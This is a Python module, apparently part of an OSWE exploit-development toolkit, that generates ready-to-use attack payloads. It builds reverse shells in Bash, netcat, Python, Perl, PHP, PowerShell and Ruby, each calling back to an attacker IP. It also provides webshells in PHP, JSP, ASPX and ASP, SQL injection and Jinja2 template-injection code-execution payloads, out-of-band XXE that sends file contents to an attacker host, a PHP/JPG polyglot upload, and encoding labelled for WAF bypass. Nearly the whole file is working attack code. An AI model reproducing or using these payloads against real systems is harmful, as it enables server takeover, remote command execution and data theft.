#!/usr/bin/env python3
"""
Centralized Payload Generation for OSWE PoC Development

Provides common payloads across all vulnerability types including:
- Reverse shells (Bash, PowerShell, Python, Perl, PHP, etc.)
- Webshells (PHP, JSP, ASPX, ASP)
- Encoding/Decoding utilities
- File upload payloads
- Common exploitation patterns

Usage:
    from modules.payloads import reverse_shell_bash, php_webshell_simple

    shell = reverse_shell_bash("10.10.14.5", 4444)
    webshell = php_webshell_simple()
"""

import base64
import urllib.parse
import binascii
from typing import Optional


# ============================================================================
# REVERSE SHELLS
# ============================================================================

def reverse_shell_bash(ip: str, port: int) -> str:
    """
    Bash reverse shell using /dev/tcp.

    Args:
        ip: Attacker IP address
        port: Attacker listening port

    Returns:
        Bash reverse shell command
    """
    return f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'"


def reverse_shell_bash_encoded(ip: str, port: int) -> str:
    """
    Base64-encoded bash reverse shell for WAF bypass.

    Args:
        ip: Attacker IP address
        port: Attacker listening port

    Returns:
        Command with base64-encoded reverse shell
    """
    shell = reverse_shell_bash(ip, port)
    encoded = base64.b64encode(shell.encode()).decode()
    return f"echo {encoded} | base64 -d | bash"


def reverse_shell_nc(ip: str, port: int, use_e_flag: bool = True) -> str:
    """
    Netcat reverse shell.

    Args:
        ip: Attacker IP address
        port: Attacker listening port
        use_e_flag: Use -e flag (traditional nc) vs pipe method

    Returns:
        Netcat reverse shell command
    """
    if use_e_flag:
        return f"nc -e /bin/sh {ip} {port}"
    else:
        return f"rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {ip} {port} > /tmp/f"


def reverse_shell_python(ip: str, port: int, version: int = 3) -> str:
    """
    Python reverse shell.

    Args:
        ip: Attacker IP address
        port: Attacker listening port
        version: Python version (2 or 3)

    Returns:
        Python reverse shell one-liner
    """
    if version == 2:
        return f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    else:
        return f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"


def reverse_shell_perl(ip: str, port: int) -> str:
    """
    Perl reverse shell.

    Args:
        ip: Attacker IP address
        port: Attacker listening port

    Returns:
        Perl reverse shell one-liner
    """
    return f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"


def reverse_shell_php(ip: str, port: int) -> str:
    """
    PHP reverse shell one-liner.

    Args:
        ip: Attacker IP address
        port: Attacker listening port

    Returns:
        PHP reverse shell command
    """
    return f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"


def reverse_shell_powershell(ip: str, port: int, encode: bool = True) -> str:
    """
    PowerShell reverse shell.

    Args:
        ip: Attacker IP address
        port: Attacker listening port
        encode: Return as base64-encoded command for -EncodedCommand

    Returns:
        PowerShell reverse shell command
    """
    ps_script = f"""$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()"""

    if encode:
        # Encode for PowerShell -EncodedCommand
        encoded = base64.b64encode(ps_script.encode('utf-16le')).decode()
        return f"powershell -EncodedCommand {encoded}"
    else:
        return f"powershell -c \"{ps_script}\""


def reverse_shell_ruby(ip: str, port: int) -> str:
    """
    Ruby reverse shell.

    Args:
        ip: Attacker IP address
        port: Attacker listening port

    Returns:
        Ruby reverse shell one-liner
    """
    return f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"


# ============================================================================
# WEBSHELLS
# ============================================================================

def php_webshell_simple() -> str:
    """Simple PHP webshell accepting 'cmd' parameter."""
    return "<?php system($_REQUEST['cmd']); ?>"


def php_webshell_get() -> str:
    """PHP webshell using GET parameter."""
    return "<?php if(isset($_GET['cmd'])){ system($_GET['cmd']); } ?>"


def php_webshell_post() -> str:
    """PHP webshell using POST parameter."""
    return "<?php if(isset($_POST['cmd'])){ echo shell_exec($_POST['cmd']); } ?>"


def php_webshell_obfuscated() -> str:
    """Slightly obfuscated PHP webshell."""
    return "<?php @eval($_REQUEST['cmd']); ?>"


def jsp_webshell_simple() -> str:
    """Simple JSP webshell."""
    return """<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    if(cmd != null) {
        Process p = Runtime.getRuntime().exec(cmd);
        InputStream in = p.getInputStream();
        int c;
        while((c = in.read()) != -1) {
            out.print((char)c);
        }
        in.close();
    }
%>"""


def jsp_webshell_minimal() -> str:
    """Minimal JSP webshell."""
    return "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"


def aspx_webshell_simple() -> str:
    """Simple ASPX webshell."""
    return """<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Page_Load(object sender, EventArgs e) {
    if(Request["cmd"] != null) {
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + Request["cmd"];
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.Start();
        Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
    }
}
</script>"""


def aspx_webshell_minimal() -> str:
    """Minimal ASPX webshell."""
    return "<%@ Page Language=\"C#\" %><%Response.Write(System.Diagnostics.Process.Start(\"cmd.exe\", \"/c \" + Request[\"cmd\"]).StandardOutput.ReadToEnd());%>"


def asp_webshell_simple() -> str:
    """Classic ASP webshell."""
    return """<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
If Request.Form("cmd") <> "" Then
    szCMD = Request.Form("cmd")
    Set oExec = oScript.Exec(szCMD)
    Response.Write(oExec.StdOut.ReadAll())
End If
%>"""


# ============================================================================
# ENCODING/DECODING UTILITIES
# ============================================================================

def base64_encode(data: str) -> str:
    """
    Base64 encode string.

    Args:
        data: String to encode

    Returns:
        Base64-encoded string
    """
    return base64.b64encode(data.encode()).decode()


def base64_decode(data: str) -> str:
    """
    Base64 decode string.

    Args:
        data: Base64-encoded string

    Returns:
        Decoded string
    """
    return base64.b64decode(data.encode()).decode()


def url_encode(data: str, safe: str = '') -> str:
    """
    URL encode string.

    Args:
        data: String to encode
        safe: Characters that should not be encoded

    Returns:
        URL-encoded string
    """
    return urllib.parse.quote(data, safe=safe)


def url_decode(data: str) -> str:
    """
    URL decode string.

    Args:
        data: URL-encoded string

    Returns:
        Decoded string
    """
    return urllib.parse.unquote(data)


def hex_encode(data: str) -> str:
    """
    Hex encode string.

    Args:
        data: String to encode

    Returns:
        Hex-encoded string
    """
    return binascii.hexlify(data.encode()).decode()


def hex_decode(data: str) -> str:
    """
    Hex decode string.

    Args:
        data: Hex-encoded string

    Returns:
        Decoded string
    """
    return binascii.unhexlify(data.encode()).decode()


def double_url_encode(data: str) -> str:
    """
    Double URL encode for WAF bypass.

    Args:
        data: String to encode

    Returns:
        Double URL-encoded string
    """
    return url_encode(url_encode(data))


# ============================================================================
# SQL INJECTION PAYLOADS
# ============================================================================

def sqli_sleep_mysql(seconds: int = 5) -> str:
    """MySQL sleep payload for time-based SQLi."""
    return f"' OR SLEEP({seconds})-- -"


def sqli_sleep_postgres(seconds: int = 5) -> str:
    """PostgreSQL sleep payload for time-based SQLi."""
    return f"' OR pg_sleep({seconds})-- -"


def sqli_sleep_mssql(seconds: int = 5) -> str:
    """MSSQL sleep payload for time-based SQLi."""
    return f"'; WAITFOR DELAY '00:00:0{seconds}'-- -"


def sqli_union_probe(columns: int) -> str:
    """
    Generate UNION SELECT probe for column count detection.

    Args:
        columns: Number of columns to test

    Returns:
        UNION SELECT payload
    """
    null_list = ','.join(['NULL'] * columns)
    return f"' UNION SELECT {null_list}-- -"


# ============================================================================
# DESERIALIZATION PAYLOADS
# ============================================================================

def java_serialization_magic_bytes() -> bytes:
    """Return Java serialization magic bytes."""
    return b'\xac\xed\x00\x05'


def php_serialize_simple(class_name: str, properties: dict) -> str:
    """
    Create simple PHP serialized object.

    Args:
        class_name: PHP class name
        properties: Dictionary of property names and values

    Returns:
        PHP serialized object string
    """
    prop_count = len(properties)
    props = ''
    for key, value in properties.items():
        props += f's:{len(key)}:"{key}";s:{len(str(value))}:"{value}";'
    return f'O:{len(class_name)}:"{class_name}":{prop_count}:{{{props}}}'


# ============================================================================
# XXE PAYLOADS
# ============================================================================

def xxe_file_read(filepath: str = "/etc/passwd") -> str:
    """
    Generate XXE payload for file read.

    Args:
        filepath: Path to file to read

    Returns:
        XXE payload string
    """
    return f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{filepath}">]>
<root>
    <data>&xxe;</data>
</root>"""


def xxe_oob_dtd(attacker_host: str, attacker_port: int = 80) -> str:
    """
    Generate external DTD for out-of-band XXE.

    Args:
        attacker_host: Attacker server hostname/IP
        attacker_port: Attacker server port

    Returns:
        XXE payload referencing external DTD
    """
    return f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{attacker_host}:{attacker_port}/evil.dtd"> %xxe;]>
<root>
    <data>&send;</data>
</root>"""


def xxe_oob_dtd_content(filepath: str = "/etc/passwd", attacker_host: str = "", attacker_port: int = 80) -> str:
    """
    Generate evil.dtd content for out-of-band XXE data exfiltration.

    Args:
        filepath: File to exfiltrate
        attacker_host: Attacker server hostname/IP
        attacker_port: Attacker server port

    Returns:
        Content for evil.dtd file
    """
    return f"""<!ENTITY % file SYSTEM "file://{filepath}">
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://{attacker_host}:{attacker_port}/?data=%file;'>">
%eval;"""


# ============================================================================
# TEMPLATE INJECTION PAYLOADS
# ============================================================================

def ssti_jinja2_probe() -> str:
    """Jinja2 SSTI detection payload."""
    return "{{7*7}}"


def ssti_jinja2_rce(command: str) -> str:
    """
    Jinja2 SSTI RCE payload.

    Args:
        command: OS command to execute

    Returns:
        SSTI payload for RCE
    """
    # Using MRO to access Popen
    return f"{{% for c in [].__class__.__base__.__subclasses__() %}}{{% if c.__name__ == 'catch_warnings' %}}{{% for b in c.__init__.__globals__.values() %}}{{% if b.__class__ == {{}}.__class__ %}}{{% if 'eval' in b.keys() %}}{{{{ b['eval']('__import__(\"subprocess\").check_output(\"{command}\", shell=True)') }}}}{{% endif %}}{{% endif %}}{{% endfor %}}{{% endif %}}{{% endfor %}}"


def ssti_jinja2_config_read() -> str:
    """Jinja2 payload to read Flask config."""
    return "{{config}}"


# ============================================================================
# FILE UPLOAD PAYLOADS
# ============================================================================

def php_polyglot_jpg_header() -> bytes:
    """
    Return JPG magic bytes for polyglot PHP files.

    Returns:
        JPG magic bytes
    """
    return b'\xFF\xD8\xFF\xE0'


def create_php_polyglot_image(php_code: str = "<?php system($_GET['cmd']); ?>") -> bytes:
    """
    Create a polyglot PHP/JPG file.

    Args:
        php_code: PHP code to embed

    Returns:
        Bytes of polyglot file
    """
    jpg_header = php_polyglot_jpg_header()
    return jpg_header + b'\x00\x10JFIF' + php_code.encode()


# ============================================================================
# COMMAND INJECTION PAYLOADS
# ============================================================================

def command_injection_separators() -> list:
    """
    Return list of command injection separator characters.

    Returns:
        List of separator strings
    """
    return [';', '|', '||', '&', '&&', '\n', '`', '$()']


def command_injection_payload(separator: str, command: str) -> str:
    """
    Generate command injection payload.

    Args:
        separator: Separator character/string
        command: Command to inject

    Returns:
        Command injection payload
    """
    return f"{separator}{command}"


# ============================================================================
# UTILITY FUNCTIONS
# ============================================================================

def generate_random_string(length: int = 8) -> str:
    """
    Generate random alphanumeric string.

    Args:
        length: Length of string to generate

    Returns:
        Random string
    """
    import random
    import string
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))


def create_marker(prefix: str = "OSWE") -> str:
    """
    Create unique marker for exploitation verification.

    Args:
        prefix: Prefix for marker

    Returns:
        Unique marker string
    """
    import random
    import string
    random_suffix = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    return f"{prefix}_{random_suffix}"
